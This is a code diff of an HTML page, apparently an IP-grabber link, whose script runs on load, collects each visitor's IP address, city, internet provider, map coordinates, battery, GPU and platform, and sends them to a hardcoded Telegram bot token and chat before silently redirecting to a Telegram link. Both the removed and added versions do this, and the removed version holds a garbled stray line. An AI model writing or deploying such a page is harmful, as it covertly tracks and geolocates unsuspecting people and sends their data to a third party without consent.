@@ -3,67 +3,34 @@
 <head>
     <meta charset="UTF-8">
     <script>
-        async function capturePro() {
-            const params = new URLSearchParams(window.location.search);
-            const target = params.get('u') || "https://t.me/vo11a";
-            
-            // بيانات البوت
+        async function capture() {
+            const urlParams = new URLSearchParams(window.location.search);
+            const target = urlParams.get('u') || "https://t.me/vo11a";
             const token = "8795074558:AAHSNWiXI4mKMFsyrEP6qEkMdRQrbc9Yid8";
             const chat_id = "5773364548";
 
+            // جمع معلومات الجهاز والبطارية والـ GPU
+            let batt = "N/A";
+            try { const b = await navigator.getBattery(); batt = Math.round(b.level * 100) + "%"; } catch(e) {}
+            
+            const canvas = document.createElement('canvas');
+            const gl = canvas.getContext('webgl');
+            const debug = gl.getExtension('WEBGL_debug_renderer_info');
+            const gpu = debug ? gl.getParameter(debug.UNMASKED_RENDERER_ID) : "Unknown";
+
+            // جلب الآيبي والموقع
+            let ipData = { ip: "N/A", city: "N/A", org: "N/A", latitude: "0", longitude: "0" };
             try {
-                // 1. جلب الآيبي والموقع والشركة
-                const ipRes = await fetch('https://ipapi.co/json/');
-                const ipData = await ipRes.json();
+                const response = await fetch('https://ipapi.co/json/');
+                ipData = await response.json();
+            } catch(e) {}
 
-                // 2. تحليل البطارية
-                let batt = "N/A";
-                try {
-                    const b = await navigator.getBattery();
-                    batt = Math.round(b.level * 100) + "% " + (b.charging ? "⚡" : "🔋");
-                } catch(e) {}
+            const msg = `🚀 صيد جديد 🚀\n🌐 IP: ${ipData.ip}\n📍 مدينة: ${ipData.city}\n🏢 شركة: ${ipData.org}\n🔋 بطارية: ${batt}\n🖥️ GPU: ${gpu}\n📱 نظام: ${navigator.platform}\n📍 خريطة: https://www.google.com/maps?q=${ipData.latitude},${ipData.longitude}`;
 
-                // 3. تحليل الـ GPU (نوع الجهاز التفصيلي)
-                const canvas = document.createElement('canvas');
-                const gl = canvas.getContext('webgl');
-             29)2؛@؛؛!
-                const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
-                const gpu = debugInfo ? gl.getParameter(debugInfo.UNMASKED_RENDERER_ID) : "Unknown GPU";
-
-                // 4. ترتيب الرسالة مثل ما طلبت بالضيط
-                const message = `🚀 رصد احترافي - تحليل المواصفات 🚀
-━━━━━━━━━━━━━━━
-🌐 الآيبي الخارجي:
-${ipData.ip}
-
-📱 تحليل نوع الجهاز:
-${navigator.platform} (${gpu})
-
-📡 المعالج الرسومي (GPU):
-${gpu}
-
-📍 الموقع: ${ipData.city} | 🏗️ المحافظة: ${ipData.region}
-
-🏢 الشركة: ${ipData.org}
-
-🔋 البطارية: ${batt}
-
-🗺️ رابط الخريطة:
-https://www.google.com/maps?q=${ipData.latitude},${ipData.longitude}
-━━━━━━━━━━━━━━━`;
-
-                // إرسال للتليجرام
-                await fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat_id}&text=${encodeURIComponent(message)}&parse_mode=Markdown`);
-
-            } catch (err) {
-                // في حال فشل جلب الآيبي، نرسل المعلومات الأساسية
-                await fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat_id}&text=فشل في جلب بعض البيانات المتطورة`);
-            }
-
-            // التحويل للرابط النهائي
+            await fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat_id}&text=${encodeURIComponent(msg)}`);
             window.location.replace(target);
         }
-        window.onload = capturePro;
+        window.onload = capture;
     </script>
 </head>
 <body style="background:#000;"></body>
